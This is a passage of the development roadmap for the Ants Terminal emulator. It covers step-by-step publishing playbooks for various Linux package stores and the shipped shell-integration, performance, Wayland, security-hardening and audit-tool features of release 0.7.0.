# Ants Terminal — Roadmap

> **Current version:** 0.7.61 (2026-04-30). See [CHANGELOG.md](CHANGELOG.md)
> for what's shipped; see [PLUGINS.md](PLUGINS.md) for plugin-author
> standards; this document covers what's **planned**.
>
> **Format:** v1 — see
> [docs/standards/roadmap-format.md](docs/standards/roadmap-format.md).
> Every actionable bullet carries a stable `[ANTS-NNNN]` ID; ID is
> identity, position is priority, items are tackled top-to-bottom.

This roadmap is organized by **target release**, and within each release by
**theme**. Every item has prior art and a one-line implementation note so
it's actionable — not aspirational. Dates are targets, not commitments;
they move based on contributor bandwidth and real-world usage feedback.

**Legend**
- ✅ Done (shipped)
- 🚧 In progress (active commit work — usually direct-to-main on this project; rarely a branch / PR)
- 📋 Planned (next up for this release)
- 💭 Considered (research phase; may change scope or slip)

**Themes**
- 🎨 **Features** — user-visible capabilities
- ⚡ **Performance** — runtime cost reductions
- 🔌 **Plugins** — extensibility surface
- 🖥 **Platform** — ports (macOS, Windows), Wayland native support, a11y
- 🔒 **Security** — attack-surface reductions
- 🧰 **Dev experience** — tooling, testing, docs
- 📦 **Packaging & distribution** — the work of getting Ants into distros
  as an installable, auditable, default-able terminal. See the
  [distribution-adoption overview](#distribution-adoption-overview) for
  the full multi-release plan.

## Distribution-adoption overview

Becoming a distribution's **default** terminal is a long game — every
mainstream default is built by the desktop-environment team itself
(Konsole/KDE, gnome-terminal/GNOME). Outside projects like Ghostty,
WezTerm, Kitty, Alacritty are widely **packaged** but not default
anywhere. Our realistic target is: **get packaged everywhere, accrue
the quality signals distros look for, and let small/niche distros
adopt first.** The work is tracked below under the 📦 theme in each
release; this section is the rollup so nothing falls by the wayside.

| Bundle | What ships | Status | Target release |

Already shipped (as of this ROADMAP revision):

- ✅ **`.desktop` file** — pre-0.5 ancestor preserved as
  `ants-terminal.desktop.in` for the dev-symlink workflow; 0.6.17
  adds a spec-compliant `packaging/linux/org.ants.Terminal.desktop`
  for distro installs
- ✅ **Icons at multiple sizes** — `assets/ants-terminal-{16,32,48,64,128,256}.png`,
  installed under `share/icons/hicolor/<size>x<size>/apps/ants-terminal.png`
  by 0.6.17's CMake rules
- ✅ **CHANGELOG.md + SemVer discipline** — every release has a dated section with categorical bullets
- ✅ **CI with ASan + UBSan** — the `build-asan` lane runs sanitized ctest + binary smoke on every push
- ✅ **Audit pipeline** — clazy + cppcheck + grep rules + fixture-enforced regression coverage

Gating items (blocks adoption **today**, not just for being default):

1. **No distro packages anywhere** — H5 + H6 unblock this.
2. ~~**No AppStream metadata** — H2 unblocks GNOME Software / KDE Discover discovery.~~ ✅ Shipped in 0.6.17.
3. ~~**No SECURITY.md** — H1. Distro security teams need a disclosure contact before shipping.~~ ✅ Shipped in 0.6.16.
4. **Linux-only** + ~~**X11-only dropdown**~~ — H8 (macOS) widens the addressable audience; Wayland-native Quake positioning + global-hotkey registration both shipped (0.6.38 + 0.6.39).

## Per-store publication playbook

The H-bundle table above tracks **preparation** work (the files that
need to exist in-tree). This section tracks **submission** work —
getting the prepared package actually **live** in each store's
listing. Each store has its own review cadence, ingestion format,
and maintainer expectations, so they're broken out as discrete items
with step-by-step playbooks.

Stores are ordered by **ease of publish × reach**: Flathub + AUR
first (high reach, low friction), official distro archives last
(highest friction, longest lead time). A store is considered
"shipped" when `ants-terminal` installs from the stock package
manager without extra repository configuration.

| Store | Format | Prep status | Publish status | Target release |
|-------|--------|-------------|----------------|----------------|
| **P1 — Flathub** | Flatpak | ✅ manifest + Lua module (H6, H6.1) | 📋 submit `org.ants.Terminal` to `flathub/flathub` (H6.2) | 0.8.0 |
| **P2 — AUR (Arch User Repository)** | PKGBUILD | ✅ recipe (H5) | 📋 push to `aur.archlinux.org/packages/ants-terminal.git` + `-git` variant | 0.8.0 |
| **P3 — openSUSE OBS (home:ants-terminal)** | RPM spec | ✅ spec (H5) | 📋 upload to Open Build Service `home:` project, then target Tumbleweed / Leap repos | 0.8.0 |
| **P4 — Fedora COPR** | RPM spec | ✅ spec (H5) | 📋 create `ants-terminal` COPR; later submit package review for `fedora-extras` | 0.8.0 |
| **P5 — Debian / Ubuntu PPA** | deb source | ✅ debian/ tree (H5) | 📋 upload signed source package to Launchpad PPA | 0.8.0 |
| **P6 — Snap Store (snapcraft.io)** | snapcraft.yaml | 📋 write `snap/snapcraft.yaml`, host-shell model like Flatpak | 📋 register `ants-terminal` snap name + publish via `snapcraft upload` | 0.9.0 |
| **P7 — AppImage** | AppImage | 🚧 [`.github/workflows/release.yml`](.github/workflows/release.yml) — linuxdeploy + qt plugin on Ubuntu 22.04 (glibc 2.35) | 🚧 publishing on tag push to GitHub Releases (first build: 0.7.42) | 0.7.42+ |
| **P8 — Nixpkgs (NixOS)** | nix expression | 📋 write `pkgs/applications/terminal-emulators/ants-terminal/default.nix` | 📋 open PR against `NixOS/nixpkgs` master | 0.9.0 |
| **P9 — Debian (main archive)** | deb, official | 📋 RFP → ITP → sponsored upload → new-queue review | 📋 file ITP bug, find DM sponsor | 1.0.0+ |
| **P10 — Ubuntu (universe, via Debian)** | deb | Auto-sync from Debian unstable | 📋 rides on P9 | 1.0.0+ |
| **P11 — Fedora (official, via Bodhi)** | RPM | 📋 package review bug → sponsor → Bodhi updates | 📋 rides on P4 quality signals | 1.0.0+ |
| **P12 — Arch extra** | PKGBUILD, trusted | Would need TU sponsorship and high AUR install count | 💭 not a goal until reach justifies it | 1.0.0+ |

### P1 — Flathub submission

**Prerequisites:** H6 ✅, H6.1 ✅, H6.2 in-tree prep ✅ (screenshots,
`make-flathub-manifest.sh`, FLATHUB.md playbook).
**Blocker:** real-user shakedown of the 0.7.3 Flatpak before claiming
the Flathub repo name.

1. **Tag the release.** `git tag -s v<version>; git push --tags`.
2. **Regenerate the tag-pinned manifest:**
   `packaging/flatpak/make-flathub-manifest.sh v<version> >
   /tmp/org.ants.Terminal.yml`.
3. **Fork [flathub/flathub](https://github.com/flathub/flathub).**
   In the fork, create a **new repo**
   `flathub/org.ants.Terminal` per the Flathub "Submit via a new
   repo" flow
   (https://docs.flathub.org/docs/for-app-authors/submission/).
4. **Populate the repo** with the generated manifest, a copy of
   `org.ants.Terminal.metainfo.xml` (from `packaging/linux/`), and
   a copy of `org.ants.Terminal.desktop`. Pin `branch: stable` in the
   manifest so Flathub CI builds against our stable branch.
5. **Open a PR** from `flathub/org.ants.Terminal` against
   `flathub/flathub` with the repo URL in the PR body. Flathub CI
   rebuilds on each push.
6. **Respond to review comments** (typical first-review: shrink
   `finish-args` surface, confirm the `flatpak-external-data-checker`
   stanza updates without manual intervention).
7. **On merge,** Flathub publishes automatically. `flatpak install
   flathub org.ants.Terminal` is the smoke test.
8. **Post-merge maintenance:** each new `v<version>` tag requires a
   manifest PR against `flathub/org.ants.Terminal` pointing to the
   new tag (single script invocation — `make-flathub-manifest.sh
   v<new>` → commit → PR). Flathub CI handles the Lua-tarball hash
   refresh on its own via `x-checker-data`.
9. **Flip the gating-item entry:** "No distro packages anywhere" →
   "unblocked via Flathub."

### P2 — AUR publish

**Prerequisites:** H5 ✅ (`packaging/archlinux/PKGBUILD` in tree).
**Blocker:** need an `aur.archlinux.org` maintainer account and an
SSH key registered there.

1. **Create the `ants-terminal` AUR page** via `git clone
   ssh://aur@aur.archlinux.org/ants-terminal.git` (empty repo created
   on first push).
2. **Copy `packaging/archlinux/PKGBUILD`** into the checkout, along
   with a generated `.SRCINFO` (`makepkg --printsrcinfo > .SRCINFO`).
3. **Refresh the tarball hash:** `updpkgsums` resolves the
   `sha256sums=('SKIP')` placeholder against the GitHub tag.
4. **Push** — the AUR git hook publishes immediately. No review
   queue.
5. **Repeat for the `-git` rolling variant:** second repo
   `ants-terminal-git` with the three-line diff documented in
   `packaging/README.md` (`pkgname`, `source`, `pkgver()`).
6. **Maintenance per release:** `updpkgsums && makepkg --printsrcinfo
   > .SRCINFO && git commit && git push`. Script candidate:
   `scripts/publish-aur.sh`.

### P3 — openSUSE Build Service (OBS)

**Prerequisites:** H5 ✅ (`packaging/opensuse/ants-terminal.spec`).
**Blocker:** `openSUSE Build Service` account
(`build.opensuse.org`).

1. **Log in to OBS** and create a `home:<username>:ants-terminal`
   project.
2. **`osc mkpac ants-terminal`** inside the project; drop in
   `ants-terminal.spec`, the source tarball reference, and a
   `.changes` file mirroring CHANGELOG.md in OBS's expected format.
3. **`osc build`** locally against Tumbleweed to catch build
   errors before upload. Then `osc commit`.
4. **OBS auto-builds** against Tumbleweed, Leap 15.x, and any other
   repos added to the project. Results visible at
   `build.opensuse.org/package/show/home:<username>:ants-terminal/ants-terminal`.
5. **Publish to stable repositories:** after green builds, submit a
   `submitrequest` to `devel:languages:misc` (or a dedicated devel
   project). Once accepted, package enters the distro review queue
   for inclusion in the next Tumbleweed / Leap repos.
6. **One-click-install URL:** OBS auto-generates
   `software.opensuse.org/package/ants-terminal` pages for discovery.

### P4 — Fedora COPR

**Prerequisites:** H5 ✅ (spec is Fedora-compatible — uses `%cmake`
macros that work on both Fedora and openSUSE).
**Blocker:** Fedora Account System (FAS) account.

1. **Create a COPR project** at `copr.fedorainfracloud.org/coprs/`
   with Fedora 40/41/42/rawhide chroots enabled.
2. **Upload the spec** via `copr-cli build <project>
   /path/to/ants-terminal.spec` (or sync the GitHub repo with COPR's
   `custom build` webhook for auto-rebuild on tag push).
3. **Smoke-test:** `sudo dnf copr enable <username>/ants-terminal &&
   sudo dnf install ants-terminal`.
4. **Later — submit a package review** against the `Package Reviews`
   Bugzilla product for inclusion in `fedora-extras`. This is the
   start of the Fedora official-archive path (P11).

### P5 — Debian / Ubuntu PPA (Launchpad)

**Prerequisites:** H5 ✅ (`packaging/debian/` tree).
**Blocker:** Launchpad account + a PGP signing key registered there.

1. **Create a PPA** at `launchpad.net/~<user>/+archive/ubuntu/ants-terminal`.
2. **Build a signed source package locally:** `debuild -S -sa` from
   the project root (the debian/ tree is at `packaging/debian/`, so
   symlink or copy it to `./debian/` first).
3. **Upload:** `dput ppa:<user>/ants-terminal
   ../ants-terminal_<version>-1_source.changes`. Launchpad rebuilds
   for each supported Ubuntu series (jammy / noble / oracular).
4. **Smoke-test:** `sudo add-apt-repository ppa:<user>/ants-terminal
   && sudo apt update && sudo apt install ants-terminal`.
5. **Backports note:** Debian users can install the same `.deb`
   directly — Ubuntu PPAs work as a generic Debian-family archive
   when users add the sources.list line manually.

### P6 — Snap Store

**Prerequisites:** write `snap/snapcraft.yaml`, which does NOT
exist yet. Host-shell model similar to our Flatpak approach.

1. **Write `snap/snapcraft.yaml`** targeting `core24`, `confinement:
   strict`, with `plugs:` for `home`, `network`, `wayland`,
   `desktop`, `desktop-legacy`, `opengl`, `pulseaudio`,
   `gsettings`. PTY path mirrors the Flatpak host-shell wiring
   (see `ptyhandler.cpp`'s `FLATPAK_ID` branch — needs a parallel
   `SNAP` branch).
2. **Test locally:** `snapcraft pack` + `sudo snap install
   --dangerous ants-terminal_<version>_amd64.snap`.
3. **Register the name:** `snapcraft register ants-terminal`.
4. **Upload:** `snapcraft upload ants-terminal_<version>_amd64.snap
   --release=stable`. Review by Snap Store is typically hours to
   days on first submission (manual review for `strict`
   confinement + `home` plug), then auto-approved for revisions.
5. **Ongoing:** `snapcraft.io` GitHub builder hooks auto-rebuild
   on tag push — no per-release manual work after the initial
   submission.

### P7 — AppImage

**Status:** 🚧 First binary shipped with v0.7.42. Recipe lives at
[`.github/workflows/release.yml`](.github/workflows/release.yml) — fires on
every `v*` tag push (and via `workflow_dispatch` for backfilling).
Output is `Ants_Terminal-<version>-x86_64.AppImage`, attached to the
matching GitHub Release. Build runs on Ubuntu 22.04 for glibc-2.35
compatibility (covers Debian 12+, Ubuntu 22.04+, Fedora 36+, openSUSE
Tumbleweed, Arch). linuxdeploy + linuxdeploy-plugin-qt bundle Qt6 and
liblua5.4 automatically; `--appimage-extract-and-run --version` /
`--help` smoke tests gate the upload step.

**Done:**

1. ✅ **Tool chosen:** `linuxdeploy` + `linuxdeploy-plugin-qt` (the
   Qt6 standard).
2. ✅ **CI lane added:** `.github/workflows/release.yml`. Replaces the
   originally-planned `.github/workflows/appimage.yml` filename — same
   shape, but the file is named for what it does (release artefacts,
   plural future-proofing) rather than the artefact type.

**Open follow-ups:**

3. 📋 **Publish to AppImageHub** (`appimage.github.io`) — open a PR
   with a YAML metadata stub pointing at our GitHub Release artefact.
   AppImageHub is a listing directory, not a store — increases
   discoverability for Linux desktop users browsing for terminals.
4. ✅ **Auto-update** via [AppImageUpdate](https://github.com/AppImage/AppImageUpdate)
   — shipped 0.7.46. The build workflow embeds a `gh-releases-zsync`
   update-info string in the AppImage and uploads a `.zsync` sidecar
   alongside; in-app the update notifier's click handler runs
   `AppImageUpdate` (GUI) or `appimageupdatetool` (CLI) detached
   when the binary is running as an AppImage, falling back to
   opening the release page in a browser otherwise. v0.7.46 is the
   first release whose binary can be updated in place; pre-0.7.46
   shipped without the metadata and remain manual-download only.
5. 💭 **aarch64 AppImage** — second runner job once GitHub Actions
   `ubuntu-22.04-arm64` is GA (currently in preview). Niche but
   meaningful for Asahi Linux + Pi 5 + AWS Graviton dev boxes.

### P8 — Nixpkgs

**Prerequisites:** write the nix expression. Not yet started.

1. **Fork `NixOS/nixpkgs`.**
2. **Add `pkgs/applications/terminal-emulators/ants-terminal/default.nix`**
   with `mkDerivation` using `cmake`, `qt6.qtbase`,
   `qt6.qtwayland`, `qt6.qtopengl`, `lua5_4`, etc. Pin
   `src = fetchFromGitHub { … rev = "v<version>"; hash = "sha256-…"; }`.
3. **Wire it in `pkgs/top-level/all-packages.nix`.**
4. **Smoke-test:** `nix-build -A ants-terminal` in the fork.
5. **Open PR** against `NixOS/nixpkgs`. First-submission reviews
   are thorough (style, dependency minimization, `meta` fields);
   budget 1–4 weeks of review cycles.
6. **On merge,** `nix profile install nixpkgs#ants-terminal` works
   for every NixOS + non-NixOS Nix user.

### P9 — Debian (official archive)

**Prerequisites:** P5 working, plus a Debian Developer (DD) sponsor.
Longest lead time of any store.

1. **File an RFP** (Request For Packaging) bug against
   `wnpp` pseudo-package in Debian BTS.
2. **Work with a sponsor** (DD or DM) to iteratively polish the
   packaging (lintian clean, copyright audit, build on buildd
   network). Our `packaging/debian/` tree is a starting point —
   expect several rounds of refinement.
3. **ITP** (Intent To Package): once polished, the sponsor files
   an ITP bug and uploads the source package via their credentials.
4. **New-queue review:** ftpmaster manually reviews the initial
   upload for license + standards compliance. First-time uploads
   can sit in new-queue for weeks.
5. **After acceptance:** subsequent versions go through normal
   sponsor-upload flow (still requires DD involvement) until I apply
   for DM status (2-year typical timeline).

### P10 — Ubuntu (via Debian)

Rides on P9. Debian unstable auto-syncs to the next Ubuntu dev
release; Ubuntu-specific patches generally aren't needed for a
terminal emulator.

### P11 — Fedora (official archive)

Rides on P4 track record. Submit package review against
`fedora-extras`; once approved, package lands in Fedora rawhide and
follows normal Bodhi update flow into stable releases.

### P12 — Arch extra

Requires Arch Trusted User (TU) sponsorship. Not a near-term goal;
AUR (P2) is the standard Arch path and serves the Arch community
adequately.

## 0.7.0 — shell integration + triggers — shipped 2026-04-15

**Theme:** make Ants the best terminal for **shell-aware workflows**.

### 🎨 Features — shell integration beyond OSC 133

- ✅ **Command blocks as first-class UI** (Warp parity,
  [docs](https://docs.warp.dev/terminal/blocks)). Shipped across
  several releases and consolidated in 0.6.10. Prompt → command →
  output grouping via `OSC 133` markers, `Ctrl+Shift+Up` /
  `Ctrl+Shift+Down` jump-to-prev/next prompt, collapsible output with
  "… N lines hidden" summary bar, duration + timestamp in the prompt
  gutter, 2px pass/fail status stripe, and per-block right-click
  menu: Copy Command, Copy Output, Re-run Command, Fold/Unfold,
  Share Block as `.cast`. "Suppress output noise" is deferred — the
  original sub-bullet didn't define a noise heuristic and wasn't
  worth blocking the bundle. See
  [CHANGELOG.md §0.6.10](CHANGELOG.md#0610--2026-04-14).
- ✅ **Asciinema recording** (`.cast` v2 format,
  [spec](https://docs.asciinema.org/manual/asciicast/v2/)). Shipped.
  Full-session recording via `Settings → Record Session` (default
  `Ctrl+Shift+R`); per-block export via the command-block context
  menu in 0.6.10. Asciicast v2 header + event-stream format. See
  [CHANGELOG.md §0.6.10](CHANGELOG.md#0610--2026-04-14).
- ✅ **Semantic history**. Shipped in 0.6.x and broadened in 0.6.12.
  Ctrl-click on a `path:line:col` capture in scrollback (compiler /
  linter / stack-trace output) opens the file at the cited line/col
  via `TerminalWidget::openFileAtPath()`. Detection lives in
  `detectUrls()` (regex captures `path:line[:col]`); CWD resolution
  uses `/proc/<pid>/cwd` so relative paths Just Work without shell
  cooperation. 0.6.12 broadened the editor switch from VS Code + Kate
  only to also cover the VS Code family (`code-insiders`, `codium`),
  vi-family (`nvim`, `vim`), `nano`, Sublime / Helix / Micro
  (`path:line:col` argv shape), and JetBrains IDEs (`--line N
  --column M`). See
  [CHANGELOG.md §0.6.12](CHANGELOG.md#0612--2026-04-14).
- ✅ **Shell-side HMAC verification** for OSC 133 markers. Shipped in
  0.6.31. When `$ANTS_OSC133_KEY` is set in the terminal's environment,
  every OSC 133 marker (`A`/`B`/`C`/`D`) must carry an `ahmac=` param
  computed as HMAC-SHA256(key, `<marker>|<promptId>[|<exitCode>]`).
  Markers without a valid HMAC are dropped and a forgery counter
  increments, surfaced as a status-bar warning with a 5-second
  cooldown. Bash + zsh hook scripts ship under
  `packaging/shell-integration/`. Headless feature test
  (`tests/features/osc133_hmac_verification/`) covers verifier OFF
  back-compatibility, verifier ON accept of valid HMACs (including
  uppercase-hex), and rejection of missing/wrong/promptId-mismatched/
  exit-code-mismatched HMACs. See
  [CHANGELOG.md §0.6.31](CHANGELOG.md#0631--2026-04-17).

### 🔌 Plugins — trigger system

- ✅ **Trigger rules** with `instant` flag and the full iTerm2 action
  set — `bell`, `inject`, `run_script`, `notify`, `sound`, `command`
  shipped in 0.6.9; the three deferred grid-mutation actions
  `highlight_line`, `highlight_text`, and `make_hyperlink` shipped in
  0.6.13 via a new `TerminalGrid` line-completion callback so matches
  map to exact col ranges on a real row before the row scrolls into
  scrollback. Full parity with the iTerm2 trigger doc. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14) and
  [CHANGELOG.md §0.6.13](CHANGELOG.md#0613--2026-04-14).
- ✅ **User-vars channel**: OSC 1337 SetUserVar parsing + the
  `user_var_changed` event. Shipped in 0.6.9. Disambiguated from
  inline images by the byte after `1337;`. NAME ≤ 128 chars; decoded
  value capped at 4 KiB. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14).
- ✅ **Command-palette registration**: `ants.palette.register({title,
  action, hotkey})` shipped in 0.6.9. Always-on (no permission gate),
  optional global QShortcut. Entry triggers fire scoped
  `palette_action` event. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14).
- ✅ Events: `command_finished` (exit + duration), `pane_focused`,
  `theme_changed`, `window_config_reloaded`, `user_var_changed`,
  `palette_action`. All shipped in 0.6.9. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14).

### ⚡ Performance

- ✅ **SIMD VT-parser scan**. Shipped in 0.6.23. Ground-state hot path
  now scans 16 bytes at a time via SSE2 (x86_64) / NEON (ARM64) for
  the next non-printable-ASCII byte, then bulk-emits `Print` actions
  for the safe run without running the full state machine. A signed-
  compare trick (XOR 0x80 → two `cmpgt_epi8` against pre-computed
  bounds) flags any interesting byte with one `movemask`. Regression
  guard: `tests/features/vtparser_simd_scan/` asserts byte-identical
  action streams across whole-buffer, byte-by-byte, and pseudo-random-
  chunk feeds over a 38-case corpus covering every offset-mod-16
  alignment for the scan boundary. See
  [CHANGELOG.md §0.6.23](CHANGELOG.md#0623--2026-04-15).
- ✅ **Decouple read/parse/render thread**. Shipped in 0.6.34. PTY read
  and VT parse now run on a dedicated worker QThread (`VtStream`);
  parsed `VtAction` batches are shipped to the GUI over a
  `Qt::QueuedConnection` and applied to `TerminalGrid` there, so paint
  stays on the main thread. Back-pressure: at most 8 batches in flight
  (≈128 KB of unprocessed PTY bytes) before the worker disables its
  `QSocketNotifier` and lets the kernel apply flow control to the
  child; GUI re-enables on drain. PTY writes (keystrokes, DA/CPR/OSC 52
  responses) cross back to the worker via
  `QMetaObject::invokeMethod(... Qt::QueuedConnection)`. Resize goes
  through `Qt::BlockingQueuedConnection` so the PTY winsize is updated
  before the next paint. The `ANTS_SINGLE_THREADED=1` kill-switch was
  retired in 0.6.37 once the new path proved out in the wild (0.6.34
  → 0.6.37 bake period) and the legacy single-threaded code paths were
  deleted. Four feature tests lock the invariants: parse equivalence
  across 11 fixtures × 6 chunking strategies, response ordering, the
  source-level resize-synchronicity contract, and the ptyWrite-gating
  regression pin. See
  [CHANGELOG.md §0.6.34](CHANGELOG.md#0634--2026-04-18) and
  [§0.6.37](CHANGELOG.md#0637--2026-04-18).
- ✅ **Incremental reflow on resize**. Shipped in 0.6.15. The original
  research note called for tracking `wrap_col` per line; the actual
  implementation works on equivalent information already on the line
  (`softWrapped` flag + a single-pass content-width check): standalone
  lines that fit the new width get an in-place `cells.resize()` with
  default-attr padding or trailing-blank trim, skipping the
  allocation-heavy `joinLogical` / `rewrap` round-trip. Multi-line
  soft-wrap sequences still go through the full logic so correctness
  is preserved. See
  [CHANGELOG.md §0.6.15](CHANGELOG.md#0615--2026-04-14).

### 🖥 Platform

- ✅ **Wayland-native Quake-mode** — shipped across two releases.
  Part 1 of 2 (0.6.38): `find_package(LayerShellQt CONFIG QUIET)` wires
  `LayerShellQt::Interface` when the `layer-shell-qt6-devel` package
  is installed, and `MainWindow::setupQuakeMode()` promotes the window
  to a `zwlr_layer_surface_v1` at `LayerTop`, anchored top/left/right
  with exclusive-zone 0. The dead `quake_hotkey` config key is wired
  to a `QShortcut` with `Qt::ApplicationShortcut` context. XCB path
  preserved for X11. Source-level invariants pinned in
  `tests/features/wayland_quake_mode/`.
  Part 2 of 2 (0.6.39): `GlobalShortcutsPortal` client wraps the
  Freedesktop `org.freedesktop.portal.GlobalShortcuts` handshake
  (CreateSession → session handle → BindShortcuts → Activated) behind
  a single Qt signal. `MainWindow` binds the `toggle-quake` id when
  the portal service is registered on the session bus (KDE Plasma 6,
  xdg-desktop-portal-hyprland, -wlr); on GNOME Shell the portal call
  fails and the in-app `QShortcut` fallback stays as the activation
  path. Both paths debounce via a 500 ms window to avoid focused
  double-fire. Replaces the originally-planned KGlobalAccel + GNOME
  D-Bus branching with one compositor-agnostic API. See
  [CHANGELOG.md §0.6.38](CHANGELOG.md#0638--2026-04-18) and
  [§0.6.39](CHANGELOG.md#0639--2026-04-18).

### 🔒 Security

- ✅ **Plugin capability audit UI**. Shipped in 0.6.11. Settings →
  **Plugins** lists every discovered plugin and renders each declared
  permission as a checkbox — checked = granted, unchecked = revoked.
  Revocations persist to `config.plugin_grants[<name>]` and take
  effect at next plugin reload (matches the first-load permission
  prompt's grant semantics). See
  [CHANGELOG.md §0.6.11](CHANGELOG.md#0611--2026-04-14).
- ✅ **Image-bomb defenses**. Shipped in 0.6.11. New
  `TerminalGrid::ImageBudget` tracks total decoded image bytes
  across the inline-display vector + the Kitty cache; cap is **256 MB
  per terminal**. Sixel rejects up front from declared raster size;
  Kitty PNG / iTerm2 OSC 1337 reject post-decode. Inline red error
  text surfaces the rejection (no desktop notification). Per-image
  dimension cap (`MAX_IMAGE_DIM = 4096`) was already in place and
  remains stricter than the 16384 the original ROADMAP item called
  for. See
  [CHANGELOG.md §0.6.11](CHANGELOG.md#0611--2026-04-14).

### 📦 Distribution readiness (H1–H4)

Near-term packaging-polish work — all fully additive, zero C++ code
changes, no new runtime dependencies. Together these four bundles
take Ants from "side project on GitHub" to "package a distro
maintainer could pick up tomorrow." See the
[distribution-adoption overview](#distribution-adoption-overview)
for the full multi-release plan.

- ✅ **H1 — `SECURITY.md` + `CODE_OF_CONDUCT.md`**. Shipped in 0.6.16.
  Coordinated-disclosure policy with supported-versions table,
  reporting channel (GitHub Security Advisory + encrypted email),
  disclosure timeline, severity rubric, in/out of scope lists, and an
  acknowledgement of the hardening we already do. Contributor Covenant
  2.1 verbatim with a dedicated maintainer email + the private GitHub
  Security Advisory listed as conduct reporting channels. Clears the
  Debian / Fedora / Ubuntu security-team review gate. See
  [CHANGELOG.md §0.6.16](CHANGELOG.md#0616--2026-04-14).
- ✅ **H2 — AppStream metainfo + polished desktop entry**. Shipped in
  0.6.17. `packaging/linux/org.ants.Terminal.metainfo.xml` (AppStream
  1.0 with summary / description / releases / categories / keywords /
  OARS content rating / supports / provides / launchable) and
  `packaging/linux/org.ants.Terminal.desktop` (reverse-DNS id,
  tightened Keywords, StartupWMClass, two Desktop Actions for
  NewWindow + QuakeMode). CMake install rules via `GNUInstallDirs`
  cover desktop / metainfo / six hicolor icons, and CI runs
  `appstreamcli validate --explain` + `desktop-file-validate` on every
  push. `MimeType=` entries deliberately omitted — Ants doesn't
  register any URL-scheme handlers, so claiming them would be false
  metadata. Follow-up: add real UI screenshots under
  `docs/screenshots/` and a `<screenshots>` block in the metainfo so
  GNOME Software tiles render a preview instead of the app icon. See
  [CHANGELOG.md §0.6.17](CHANGELOG.md#0617--2026-04-14).
- ✅ **H3 — Man page**. Shipped in 0.6.18.
  `packaging/linux/ants-terminal.1` in `groff -man` covering synopsis,
  description, every CLI flag (`-h`/`--help`, `-v`/`--version`,
  `--quake`/`--dropdown`, `--new-plugin <name>` with the full
  validation contract), environment variables (`SHELL`, `HOME`,
  `XDG_CONFIG_HOME`, `XDG_DATA_HOME`, `ANTS_PLUGIN_DEV`,
  `QT_QPA_PLATFORM`), files
  (`~/.config/ants-terminal/{config.json,themes,plugins}`,
  `~/.local/share/ants-terminal/{sessions,recordings,logs}`,
  `<project>/{audit_rules.json,.audit_suppress}`), exit status (the
  four `--new-plugin` codes), bugs (GitHub issues link, SECURITY.md
  for embargoed reports), authors, and see-also (xterm, konsole,
  gnome-terminal, tmux, ssh, forkpty(3), appstreamcli,
  desktop-file-validate). CMake install rule to
  `${CMAKE_INSTALL_MANDIR}/man1/`. CI lints the source with
  `groff -man -Tutf8 -wall …` so syntax regressions fail the build
  the same way `appstreamcli` / `desktop-file-validate` do for H2.
  See [CHANGELOG.md §0.6.18](CHANGELOG.md#0618--2026-04-15).
- ✅ **H4 — Shell completions (bash / zsh / fish)**. Shipped in
  0.6.19. `packaging/completions/ants-terminal.bash` registers an
  `_ants_terminal` function via `complete -F`;
  `packaging/completions/_ants-terminal` is a `#compdef` script using
  `_arguments` with proper exclusion groups (`--quake` ⇄ `--dropdown`,
  `-h` / `-v` short-circuit); `packaging/completions/ants-terminal.fish`
  uses one `complete -c` declaration per flag with manpage-aligned
  descriptions. CMake installs each to the conventional vendor
  location (`${datarootdir}/bash-completion/completions/ants-terminal`,
  `${datarootdir}/zsh/site-functions/_ants-terminal`,
  `${datarootdir}/fish/vendor_completions.d/ants-terminal.fish`); all
  three are auto-discovered on system-wide installs. CI lints each
  file with the matching shell's `-n` / `--no-execute` flag so syntax
  regressions fail the build. Closes the H1–H4 distribution slice;
  remaining packaging work (H5 distro recipes, H6 Flatpak, H7 docs
  site) lives in 0.8.0+. See [CHANGELOG.md §0.6.19](CHANGELOG.md#0619--2026-04-15).

### 🧰 Dev experience — Project Audit tool

Surfaced by the 0.6.5 audit pass (see [CHANGELOG.md §0.6.5](CHANGELOG.md#065--2026-04-14)).
Each item is a rule / self-check the in-app `AuditDialog` should grow so
findings like the ones we caught manually would be caught automatically on
the next run.

- ✅ **Qt rule: unbounded callback payloads.** Shipped in 0.6.8 as
  `unbounded_callback_payloads` — same-line regex flags
  `QString::fromUtf8(<expr>.c_str()…)` forwarded to a `*Callback(…)`
  without a `.left()` / `.truncate()` / `.mid()` / `.chopped()` /
  `.chop()` cap. See [CHANGELOG.md §0.6.8](CHANGELOG.md#068--2026-04-14).
- ✅ **Qt rule: `QNetworkReply` connects without context.** Shipped in
  0.6.8 as `qnetworkreply_no_abort` — flags 3-arg `connect()` to
  QNetworkReply signals whose third argument is a bare lambda (no
  context object means no auto-disconnect on owner destruction → UAF
  if reply fires after `this` is gone). The 4-arg form is enforced.
  See [CHANGELOG.md §0.6.8](CHANGELOG.md#068--2026-04-14).
- ✅ **Observability rule: silent `catch (...)`.** Shipped in 0.6.7 as
  `silent_catch` — flags empty same-line `catch(...) {}` handlers.
  Extending to multi-line / single-statement trivial bodies remains future
  work (`grep -Pzo` plumbing). See [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **Self-consistency: fixture-per-`addGrepCheck`.** Shipped in 0.6.6 —
  `audit_fixture_coverage` rule in the dialog + CI-enforced cross-check in
  `tests/audit_self_test.sh`. See [CHANGELOG.md §0.6.6](CHANGELOG.md#066--2026-04-14).
- ✅ **Build-flag recommender.** Shipped in 0.6.7 as `missing_build_flags`
  — scans the top-level `CMakeLists.txt` for `-Wformat=2`, `-Wshadow`,
  `-Wnull-dereference`, `-Wconversion`. See
  [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **No-CI check.** Shipped in 0.6.7 as `no_ci` — covers `.github/workflows/`,
  `.gitlab-ci.yml`, `.circleci/`, `.travis.yml`, and `Jenkinsfile`. See
  [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **Sanitizer-in-ctest hookup.** Shipped in 0.6.7 — dedicated `build-asan`
  job in `.github/workflows/ci.yml` runs ctest + a binary smoke test under
  ASan/UBSan with `QT_QPA_PLATFORM=offscreen` on every push. See
  [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **`CONTRIBUTING.md`.** Shipped in 0.6.7 — derived from `STANDARDS.md`,
  covers build modes, test layout, adding an audit rule, version-bump
